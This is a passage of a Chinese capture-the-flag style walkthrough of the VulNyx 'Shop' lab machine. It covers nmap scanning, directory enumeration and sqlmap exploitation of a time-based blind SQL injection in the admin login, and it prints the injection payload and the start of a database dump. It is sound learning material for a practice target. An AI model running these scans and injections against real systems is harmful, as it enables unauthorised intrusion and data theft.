{"pageProps":{"postData":{"id":"Vulnyxshop","contentHtml":"<h1>shop</h1>\n<h2>前期踩点</h2>\n<p>扫描存活主机，<code>40</code>是靶机</p>\n<pre><code class=\"hljs language-java\">nmap -sP <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.0</span>/<span class=\"hljs-number\">24</span>                    \nStarting Nmap <span class=\"hljs-number\">7.</span>94SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-03-07 07:18 EST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span>\nHost is <span class=\"hljs-title function_\">up</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">0.</span>00039s latency)</span>.\nMAC Address: 0A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.2</span>\nHost is <span class=\"hljs-title function_\">up</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">0.</span>00032s latency)</span>.\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">59</span>:EA:E6 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.40</span>\nHost is <span class=\"hljs-title function_\">up</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">0.</span>00041s latency)</span>.\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:4A:D6:DE (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>\nHost is up.\nNmap done: <span class=\"hljs-number\">256</span> IP <span class=\"hljs-title function_\">addresses</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">4</span> hosts up)</span> scanned in <span class=\"hljs-number\">15.05</span> seconds\n</code></pre>\n<p>扫描端口，指定<code>10000</code>速率</p>\n<pre><code class=\"hljs language-java\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.40</span>  \nStarting Nmap <span class=\"hljs-number\">7.</span>94SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-03-07 07:18 EST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.40</span>\nHost is <span class=\"hljs-title function_\">up</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">0.</span>00060s latency)</span>.\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp <span class=\"hljs-title function_\">ports</span> <span class=\"hljs-params\">(conn-refused)</span>\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:4A:D6:DE (Oracle VirtualBox virtual NIC)\n\nNmap done: <span class=\"hljs-number\">1</span> IP <span class=\"hljs-title function_\">address</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">1</span> host up)</span> scanned in <span class=\"hljs-number\">10.95</span> seconds\n</code></pre>\n<p>扫描主机信息以及服务信息</p>\n<pre><code class=\"hljs language-less\"><span class=\"hljs-selector-tag\">nmap</span> <span class=\"hljs-selector-tag\">-A</span> <span class=\"hljs-selector-tag\">-T3</span> <span class=\"hljs-selector-tag\">-O</span> <span class=\"hljs-selector-tag\">-p</span> <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-selector-class\">.56</span><span class=\"hljs-selector-class\">.40</span>\n<span class=\"hljs-selector-tag\">Starting</span> <span class=\"hljs-selector-tag\">Nmap</span> <span class=\"hljs-number\">7.94S</span><span class=\"hljs-selector-tag\">VN</span> ( <span class=\"hljs-attribute\">https</span>:<span class=\"hljs-comment\">//nmap.org ) at 2025-03-07 07:20 EST</span>\nNmap scan report for <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.40</span>\nHost is up (<span class=\"hljs-number\">0.00066s</span> latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp open  ssh     OpenSSH <span class=\"hljs-number\">7.9</span>p1 Debian <span class=\"hljs-number\">10</span>+deb10u2 (protocol <span class=\"hljs-number\">2.0</span>)\n| <span class=\"hljs-attribute\">ssh-hostkey</span>:\n|   <span class=\"hljs-number\">2048</span> <span class=\"hljs-attribute\">ce</span>:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">21</span>:<span class=\"hljs-attribute\">a9</span>:<span class=\"hljs-number\">2</span><span class=\"hljs-attribute\">a</span>:<span class=\"hljs-number\">9</span><span class=\"hljs-attribute\">e</span>:<span class=\"hljs-number\">70</span>:<span class=\"hljs-number\">2</span><span class=\"hljs-attribute\">a</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-attribute\">ae</span>:<span class=\"hljs-attribute\">d3</span>:<span class=\"hljs-attribute\">d4</span>:<span class=\"hljs-number\">31</span>:<span class=\"hljs-attribute\">ab</span>:<span class=\"hljs-number\">01</span>:ba (RSA)\n|   <span class=\"hljs-number\">256</span> <span class=\"hljs-number\">6</span><span class=\"hljs-attribute\">b</span>:<span class=\"hljs-number\">65</span>:<span class=\"hljs-number\">3</span><span class=\"hljs-attribute\">b</span>:<span class=\"hljs-number\">41</span>:<span class=\"hljs-attribute\">b3</span>:<span class=\"hljs-number\">63</span>:<span class=\"hljs-number\">0</span><span class=\"hljs-attribute\">b</span>:<span class=\"hljs-number\">12</span>:<span class=\"hljs-attribute\">ba</span>:<span class=\"hljs-attribute\">d3</span>:<span class=\"hljs-number\">69</span>:<span class=\"hljs-attribute\">ac</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-attribute\">de</span>:<span class=\"hljs-number\">39</span>:<span class=\"hljs-number\">7</span>f (ECDSA)\n|_  <span class=\"hljs-number\">256</span> <span class=\"hljs-number\">04</span>:<span class=\"hljs-attribute\">cb</span>:<span class=\"hljs-attribute\">d9</span>:<span class=\"hljs-number\">9</span><span class=\"hljs-attribute\">b</span>:<span class=\"hljs-number\">40</span>:<span class=\"hljs-attribute\">cc</span>:<span class=\"hljs-number\">28</span>:<span class=\"hljs-number\">58</span>:<span class=\"hljs-attribute\">fc</span>:<span class=\"hljs-number\">03</span>:<span class=\"hljs-attribute\">e7</span>:<span class=\"hljs-number\">4</span><span class=\"hljs-attribute\">f</span>:<span class=\"hljs-attribute\">f7</span>:<span class=\"hljs-number\">6</span><span class=\"hljs-attribute\">a</span>:<span class=\"hljs-attribute\">e5</span>:<span class=\"hljs-number\">72</span> (ED25519)\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">38</span> ((Debian))\n|<span class=\"hljs-attribute\">_http-server-header</span>: Apache/<span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">38</span> (Debian)\n|<span class=\"hljs-attribute\">_http-title</span>: VulNyx Shop\nMAC <span class=\"hljs-attribute\">Address</span>: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">4</span><span class=\"hljs-attribute\">A</span>:<span class=\"hljs-attribute\">D6</span>:DE (Oracle VirtualBox virtual NIC)\n<span class=\"hljs-attribute\">Warning</span>: OSScan results may be unreliable because we could <span class=\"hljs-keyword\">not</span> find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice <span class=\"hljs-attribute\">type</span>: general purpose\n<span class=\"hljs-attribute\">Running</span>: Linux <span class=\"hljs-number\">4</span>.X|<span class=\"hljs-number\">5</span>.X\nOS <span class=\"hljs-attribute\">CPE</span>: <span class=\"hljs-attribute\">cpe</span>:/<span class=\"hljs-attribute\">o</span>:<span class=\"hljs-attribute\">linux</span>:<span class=\"hljs-attribute\">linux_kernel</span>:<span class=\"hljs-number\">4</span> <span class=\"hljs-attribute\">cpe</span>:/<span class=\"hljs-attribute\">o</span>:<span class=\"hljs-attribute\">linux</span>:<span class=\"hljs-attribute\">linux_kernel</span>:<span class=\"hljs-number\">5</span>\nOS <span class=\"hljs-attribute\">details</span>: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.8</span>\nNetwork <span class=\"hljs-attribute\">Distance</span>: <span class=\"hljs-number\">1</span> hop\nService <span class=\"hljs-attribute\">Info</span>: <span class=\"hljs-attribute\">OS</span>: Linux; <span class=\"hljs-attribute\">CPE</span>: <span class=\"hljs-attribute\">cpe</span>:/<span class=\"hljs-attribute\">o</span>:<span class=\"hljs-attribute\">linux</span>:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">0.66</span> ms <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.40</span>\n\nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report any incorrect results at <span class=\"hljs-attribute\">https</span>:<span class=\"hljs-comment\">//nmap.org/submit/ .</span>\nNmap <span class=\"hljs-attribute\">done</span>: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned in <span class=\"hljs-number\">15.66</span> seconds\n</code></pre>\n<p>漏洞扫描，扫出来一些令人感兴趣的文件夹，以及登陆页面</p>\n<pre><code class=\"hljs language-less\"><span class=\"hljs-selector-tag\">nmap</span> <span class=\"hljs-selector-tag\">-script</span>=<span class=\"hljs-selector-tag\">vuln</span> <span class=\"hljs-selector-tag\">-p</span> <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-selector-class\">.56</span><span class=\"hljs-selector-class\">.40</span>\n<span class=\"hljs-selector-tag\">Starting</span> <span class=\"hljs-selector-tag\">Nmap</span> <span class=\"hljs-number\">7.94S</span><span class=\"hljs-selector-tag\">VN</span> ( <span class=\"hljs-attribute\">https</span>:<span class=\"hljs-comment\">//nmap.org ) at 2025-03-07 07:21 EST</span>\nPre-scan script <span class=\"hljs-attribute\">results</span>:\n| <span class=\"hljs-attribute\">broadcast-avahi-dos</span>:\n|   Discovered <span class=\"hljs-attribute\">hosts</span>:\n|     <span class=\"hljs-number\">224.0</span>.<span class=\"hljs-number\">0.251</span>\n|   After NULL UDP avahi packet DoS (CVE-<span class=\"hljs-number\">2011</span>-<span class=\"hljs-number\">1002</span>).\n|_  Hosts are all up (<span class=\"hljs-keyword\">not</span> vulnerable).\n<span class=\"hljs-attribute\">Stats</span>: <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">39</span> elapsed; <span class=\"hljs-number\">0</span> hosts completed (<span class=\"hljs-number\">0</span> up), <span class=\"hljs-number\">1</span> undergoing ARP Ping Scan\nParallel DNS resolution of <span class=\"hljs-number\">1</span> host. <span class=\"hljs-attribute\">Timing</span>: About <span class=\"hljs-number\">0.00%</span> done\nNmap scan report for <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.40</span>\nHost is up (<span class=\"hljs-number\">0.00051s</span> latency).\n\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\n|<span class=\"hljs-attribute\">_http-stored-xss</span>: Couldn't find any stored XSS vulnerabilities.\n|<span class=\"hljs-attribute\">_http-csrf</span>: Couldn't find any CSRF vulnerabilities.\n| <span class=\"hljs-attribute\">http-cookie-flags</span>:\n|   /administrator/:\n|     <span class=\"hljs-attribute\">PHPSESSID</span>:\n|       httponly flag <span class=\"hljs-keyword\">not</span> set\n|   /administrator/index.<span class=\"hljs-attribute\">php</span>:\n|     <span class=\"hljs-attribute\">PHPSESSID</span>:\n|       httponly flag <span class=\"hljs-keyword\">not</span> set\n|   /administrator/login.<span class=\"hljs-attribute\">php</span>:\n|     <span class=\"hljs-attribute\">PHPSESSID</span>:\n|_      httponly flag <span class=\"hljs-keyword\">not</span> set\n|<span class=\"hljs-attribute\">_http-dombased-xss</span>: Couldn't find any DOM based XSS.\n| <span class=\"hljs-attribute\">http-enum</span>:\n|   /administrator/: Possible admin folder\n|   /administrator/index.<span class=\"hljs-attribute\">php</span>: Possible admin folder\n|_  /administrator/login.<span class=\"hljs-attribute\">php</span>: Possible admin folder\nMAC <span class=\"hljs-attribute\">Address</span>: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">4</span><span class=\"hljs-attribute\">A</span>:<span class=\"hljs-attribute\">D6</span>:DE (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-attribute\">done</span>: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned in <span class=\"hljs-number\">62.31</span> seconds\n</code></pre>\n<p>访问<code>HTTP</code>服务，并查看指纹信息</p>\n<p><img src=\"/post-images/Vulnyxshop/image30.png\" alt=\"image.png\"></p>\n<p>主页上的连接全是无效的，从<code>nmap</code>枚举出来文件入手</p>\n<h2>WEB渗透</h2>\n<p>访问<code>login.php</code></p>\n<p><img src=\"/post-images/Vulnyxshop/image31.png\" alt=\"image.png\"></p>\n<p>扫描一下目录</p>\n<pre><code class=\"hljs language-java\">dirsearch -u <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.40</span> -x <span class=\"hljs-number\">403</span>,<span class=\"hljs-number\">404</span>,<span class=\"hljs-number\">429</span> -e php,zip,txt\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:<span class=\"hljs-number\">23</span>: DeprecationWarning: pkg_resources is deprecated as an API. See https:<span class=\"hljs-comment\">//setuptools.pypa.io/en/latest/pkg_resources.html</span>\n  from pkg_resources <span class=\"hljs-keyword\">import</span> DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0<span class=\"hljs-number\">.4</span><span class=\"hljs-number\">.3</span>\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: <span class=\"hljs-number\">25</span> | Wordlist size: <span class=\"hljs-number\">10439</span>\n\nOutput File: /root/Desktop/test/Shop/reports/_192<span class=\"hljs-number\">.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.40</span>/_25-<span class=\"hljs-number\">03</span>-<span class=\"hljs-number\">07_07</span>-<span class=\"hljs-number\">41</span>-<span class=\"hljs-number\">05.</span>txt\n\nTarget: http:<span class=\"hljs-comment\">//192.168.56.40/</span>\n\n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">41</span>:<span class=\"hljs-number\">05</span>] Starting: \n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">41</span>:<span class=\"hljs-number\">18</span>] <span class=\"hljs-number\">301</span> -  322B  - /administrator  ->  http:<span class=\"hljs-comment\">//192.168.56.40/administrator/</span>\n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">41</span>:<span class=\"hljs-number\">18</span>] <span class=\"hljs-number\">200</span> -  337B  - /administrator/\n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">41</span>:<span class=\"hljs-number\">18</span>] <span class=\"hljs-number\">200</span> -  337B  - /administrator/index.php\n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">41</span>:<span class=\"hljs-number\">18</span>] <span class=\"hljs-number\">200</span> -    0B  - /administrator/login.php\n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">41</span>:<span class=\"hljs-number\">27</span>] <span class=\"hljs-number\">301</span> -  312B  - /css  ->  http:<span class=\"hljs-comment\">//192.168.56.40/css/</span>\n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">41</span>:<span class=\"hljs-number\">31</span>] <span class=\"hljs-number\">301</span> -  314B  - /fonts  ->  http:<span class=\"hljs-comment\">//192.168.56.40/fonts/</span>\n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">41</span>:<span class=\"hljs-number\">36</span>] <span class=\"hljs-number\">301</span> -  311B  - /js  ->  http:<span class=\"hljs-comment\">//192.168.56.40/js/</span>\n</code></pre>\n<pre><code class=\"hljs language-java\">gobuster dir -u http:<span class=\"hljs-comment\">//192.168.56.40/administrator -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error -x php,asp,zip,txt</span>\n===============================================================\nGobuster v3<span class=\"hljs-number\">.6</span>                                \nby OJ <span class=\"hljs-title function_\">Reeves</span> <span class=\"hljs-params\">(<span class=\"hljs-meta\">@TheColonial</span>)</span> &#x26; Christian <span class=\"hljs-title function_\">Mehlmauer</span> <span class=\"hljs-params\">(<span class=\"hljs-meta\">@firefart</span>)</span>\n===============================================================\n[+] Url:                     http:<span class=\"hljs-comment\">//192.168.56.40/administrator</span>\n[+] Method:                  GET                                                                               \n[+] Threads:                 <span class=\"hljs-number\">10</span>                                                                                                                                                                                                \n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-<span class=\"hljs-number\">2.3</span>-medium.txt                                                                                                                                      \n[+] Negative Status codes:   <span class=\"hljs-number\">404</span>,<span class=\"hljs-number\">403</span>,<span class=\"hljs-number\">502</span>,<span class=\"hljs-number\">429</span>                                                                   \n[+] User Agent:              gobuster/<span class=\"hljs-number\">3.6</span>\n[+] Extensions:              asp,zip,txt,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode                                                                \n===============================================================\n/index.php            (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">589</span>]                                                                \n/login.php            (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">0</span>]\n/profile.php          (Status: <span class=\"hljs-number\">302</span>) [Size: <span class=\"hljs-number\">402</span>] [--> index.php]\n/logout.php           (Status: <span class=\"hljs-number\">302</span>) [Size: <span class=\"hljs-number\">0</span>] [--> index.php]\nProgress: <span class=\"hljs-number\">1102800</span> / <span class=\"hljs-number\">1102805</span> (<span class=\"hljs-number\">100.00</span>%)\n===============================================================                  \nFinished                                                                                                       \n===============================================================\n</code></pre>\n<p>尝试进行暴力破解，也无果</p>\n<p>抓包并复制内容保存到<code>packet</code></p>\n<p><img src=\"/post-images/Vulnyxshop/image32.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/Vulnyxshop/image33.png\" alt=\"image.png\"></p>\n<p>使用<code>sqlmap</code> 尝试进行SQL注入</p>\n<pre><code class=\"hljs language-java\">sqlmap -r pakcet --batch               \n        ___                                                                                                    \n       __H__                                                                                                   \n ___ ___[<span class=\"hljs-string\">']_____ ___ ___  {1.8.11#stable}         \n|_ -| . [,]     | .'</span>| . |                                                                                      \n|___|_  [(]_|_|_|__,|  _|                                                                                      \n      |_|V...       |_|   https:<span class=\"hljs-comment\">//sqlmap.org                                                                   </span>\n                                                                                                               \n[!] legal disclaimer: Usage of sqlmap <span class=\"hljs-keyword\">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class=\"hljs-string\">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability a\nnd are not responsible for any misuse or damage caused by this program                                                                                                                                                         \n                                                                                                                                                                                                                               \n[*] starting @ 07:47:40 /2025-03-07/                                                                           \n                                                                                                                                                                                                                               \n[07:47:40] [CRITICAL] specified HTTP request file '</span>pakcet<span class=\"hljs-string\">' does not exist                             \n                                                                                                               \n[*] ending @ 07:47:40 /2025-03-07/                                                                             \n                                                                                                               \n ✘ ⚡ root@kali  ~/Desktop/test/Shop  vim packet                                                             \n ⚡ root@kali  ~/Desktop/test/Shop  sqlmap -r packet --batch \n        ___                   \n       __H__              \n ___ ___[,]_____ ___ ___  {1.8.11#stable}                                                                      \n|_ -| . [.]     | .'</span>| . |                                                                                      \n|___|_  [(]_|_|_|__,|  _|\n      |_|V...       |_|   https:<span class=\"hljs-comment\">//sqlmap.org</span>\n                                                                                                                                                                                                                               \n[!] legal disclaimer: Usage of sqlmap <span class=\"hljs-keyword\">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class=\"hljs-string\">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability a\nnd are not responsible for any misuse or damage caused by this program\n                                                       \n[*] starting @ 07:47:58 /2025-03-07/         \n                                                                                                               \n[07:47:58] [INFO] parsing HTTP request from '</span>packet<span class=\"hljs-string\">'\ncustom injection marker ('</span>*<span class=\"hljs-string\">') found in POST body. Do you want to process it? [Y/n/q] Y\n[07:47:59] [INFO] testing connection to the target URL\n[07:47:59] [INFO] testing if the target URL content is stable\n[07:47:59] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels\n[07:47:59] [INFO] testing if (custom) POST parameter '</span>#<span class=\"hljs-number\">1</span>*<span class=\"hljs-string\">' is dynamic\n[07:47:59] [INFO] testing connection to the target URL                                                                                                                                                                  [0/241]\n[07:47:59] [INFO] testing if the target URL content is stable                                                  \n[07:47:59] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels\n[07:47:59] [INFO] testing if (custom) POST parameter '</span>#<span class=\"hljs-number\">1</span>*<span class=\"hljs-string\">' is dynamic                                          \n[07:47:59] [INFO] (custom) POST parameter '</span>#<span class=\"hljs-number\">1</span>*<span class=\"hljs-string\">' appears to be dynamic       \n[07:47:59] [WARNING] heuristic (basic) test shows that (custom) POST parameter '</span>#<span class=\"hljs-number\">1</span>*<span class=\"hljs-string\">' might not be injectable   \n[07:47:59] [INFO] testing for SQL injection on (custom) POST parameter '</span>#<span class=\"hljs-number\">1</span>*<span class=\"hljs-string\">'                                   \n[07:47:59] [INFO] testing '</span>AND <span class=\"hljs-type\">boolean</span>-based blind - WHERE or HAVING clause<span class=\"hljs-string\">'                                                                                                                                                   \n[07:47:59] [INFO] testing '</span>Boolean-based blind - Parameter <span class=\"hljs-title function_\">replace</span> <span class=\"hljs-params\">(original value)</span><span class=\"hljs-string\">'\n[07:47:59] [INFO] testing '</span>MySQL >= <span class=\"hljs-number\">5.1</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY <span class=\"hljs-title function_\">clause</span> <span class=\"hljs-params\">(EXTRACTVALUE)</span><span class=\"hljs-string\">'\n[07:47:59] [INFO] testing '</span>PostgreSQL AND error-based - WHERE or HAVING clause<span class=\"hljs-string\">'                                \n[07:47:59] [INFO] testing '</span>Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING <span class=\"hljs-title function_\">clause</span> <span class=\"hljs-params\">(IN)</span><span class=\"hljs-string\">'\n[07:47:59] [INFO] testing '</span>Oracle AND error-based - WHERE or HAVING <span class=\"hljs-title function_\">clause</span> <span class=\"hljs-params\">(XMLType)</span><span class=\"hljs-string\">'                          \n[07:47:59] [INFO] testing '</span>Generic inline queries<span class=\"hljs-string\">'                                                             \n[07:47:59] [INFO] testing '</span>PostgreSQL > <span class=\"hljs-number\">8.1</span> stacked <span class=\"hljs-title function_\">queries</span> <span class=\"hljs-params\">(comment)</span><span class=\"hljs-string\">'                                         \n[07:47:59] [INFO] testing '</span>Microsoft SQL Server/Sybase stacked <span class=\"hljs-title function_\">queries</span> <span class=\"hljs-params\">(comment)</span><span class=\"hljs-string\">'                              \n[07:48:00] [INFO] testing '</span>Oracle stacked <span class=\"hljs-title function_\">queries</span> <span class=\"hljs-params\">(DBMS_PIPE.RECEIVE_MESSAGE - comment)</span><span class=\"hljs-string\">'                                                                                                                                       \n[07:48:00] [INFO] testing '</span>MySQL >= <span class=\"hljs-number\">5.0</span><span class=\"hljs-number\">.12</span> AND time-based <span class=\"hljs-title function_\">blind</span> <span class=\"hljs-params\">(query SLEEP)</span><span class=\"hljs-string\">'                                                                                                                                                 \n[07:48:10] [INFO] (custom) POST parameter '</span>#<span class=\"hljs-number\">1</span>*<span class=\"hljs-string\">' appears to be '</span>MySQL >= <span class=\"hljs-number\">5.0</span><span class=\"hljs-number\">.12</span> AND time-based <span class=\"hljs-title function_\">blind</span> <span class=\"hljs-params\">(query SLEEP)</span><span class=\"hljs-string\">' injectable                                                                                                  \nit looks like the back-end DBMS is '</span>MySQL<span class=\"hljs-string\">'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y\nfor the remaining tests, do you want to include all tests for '</span>MySQL<span class=\"hljs-string\">' extending provided level (1) and risk (1) values? [Y/n] Y                                                                                                \n[07:48:10] [INFO] testing '</span>Generic UNION <span class=\"hljs-title function_\">query</span> <span class=\"hljs-params\">(NULL)</span> - <span class=\"hljs-number\">1</span> to <span class=\"hljs-number\">20</span> columns<span class=\"hljs-string\">'                              \n[07:48:10] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found\ngot a 302 redirect to '</span>http:<span class=\"hljs-comment\">//192.168.56.40/administrator/profile.php'. Do you want to follow? [Y/n] Y         </span>\nredirect is a result of a POST request. Do you want to resend original POST data to a <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">location</span>? [Y/n] Y    \n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">48</span>:<span class=\"hljs-number\">10</span>] [INFO] checking <span class=\"hljs-keyword\">if</span> the injection point <span class=\"hljs-title function_\">on</span> <span class=\"hljs-params\">(custom)</span> POST parameter <span class=\"hljs-string\">'#1*'</span> is a <span class=\"hljs-literal\">false</span> <span class=\"hljs-title function_\">positive</span>         \n<span class=\"hljs-params\">(custom)</span> POST parameter <span class=\"hljs-string\">'#1*'</span> is vulnerable. Do you want to keep testing the <span class=\"hljs-title function_\">others</span> <span class=\"hljs-params\">(<span class=\"hljs-keyword\">if</span> any)</span>? [y/N] N\nsqlmap identified the following injection <span class=\"hljs-title function_\">point</span><span class=\"hljs-params\">(s)</span> with a total of <span class=\"hljs-number\">79</span> HTTP(s) requests:\n---                       \nParameter: #<span class=\"hljs-number\">1</span>* ((custom) POST)                                                                                 \n    Type: time-based blind                                                                                     \n    Title: MySQL >= <span class=\"hljs-number\">5.0</span><span class=\"hljs-number\">.12</span> AND time-based <span class=\"hljs-title function_\">blind</span> <span class=\"hljs-params\">(query SLEEP)</span>\n    Payload: username=<span class=\"hljs-string\">' AND (SELECT 2729 FROM (SELECT(SLEEP(5)))Itjy) AND '</span>ETDU<span class=\"hljs-string\">'='</span>ETDU&#x26;password=<span class=\"hljs-number\">1</span>&#x26;submit=\n---                                                                                                                                                                                                                            \n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">48</span>:<span class=\"hljs-number\">25</span>] [INFO] the back-end DBMS is MySQL                                                                                                                                                                                   \n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">48</span>:<span class=\"hljs-number\">25</span>] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions \n<span class=\"hljs-keyword\">do</span> you want sqlmap to <span class=\"hljs-keyword\">try</span> to optimize <span class=\"hljs-title function_\">value</span><span class=\"hljs-params\">(s)</span> <span class=\"hljs-keyword\">for</span> DBMS delay <span class=\"hljs-title function_\">responses</span> <span class=\"hljs-params\">(option <span class=\"hljs-string\">'--time-sec'</span>)</span>? [Y/n] Y\nweb server operating system: Linux Debian <span class=\"hljs-number\">10</span> (buster)\nweb application technology: Apache <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.38</span>                                                                      \nback-end DBMS: MySQL >= <span class=\"hljs-number\">5.0</span><span class=\"hljs-number\">.12</span> (MariaDB fork)       \n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">48</span>:<span class=\"hljs-number\">30</span>] [INFO] fetched data logged to text files under <span class=\"hljs-string\">'/root/.local/share/sqlmap/output/192.168.56.40'</span>\n                                                       \n[*] ending @ <span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">48</span>:<span class=\"hljs-number\">30</span> /<span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">03</span>-<span class=\"hljs-number\">07</span>/                                                                             \n                                                                                  \n</code></pre>\n<h2>SQL注入</h2>\n<p>存在SQL注入，延时注入，直接将数据Dump下来</p>\n<p>获取当前数据库</p>\n<pre><code class=\"hljs language-java\">sqlmap -r packet --batch --current-db \n        ___\n       __H__\n ___ ___[<span class=\"hljs-string\">']_____ ___ ___  {1.8.11#stable}\n|_ -| . ['</span>]     | .<span class=\"hljs-string\">'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class=\"hljs-keyword\">for</span> any misuse or damage caused by <span class=\"hljs-built_in\">this</span> program\n\n[*] starting @ <span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">58</span> /<span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">03</span>-<span class=\"hljs-number\">07</span>/\n\n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">58</span>] [INFO] parsing HTTP request from <span class=\"hljs-string\">'packet'</span>\ncustom injection <span class=\"hljs-title function_\">marker</span> <span class=\"hljs-params\">(<span class=\"hljs-string\">'*'</span>)</span> found in POST body. Do you want to 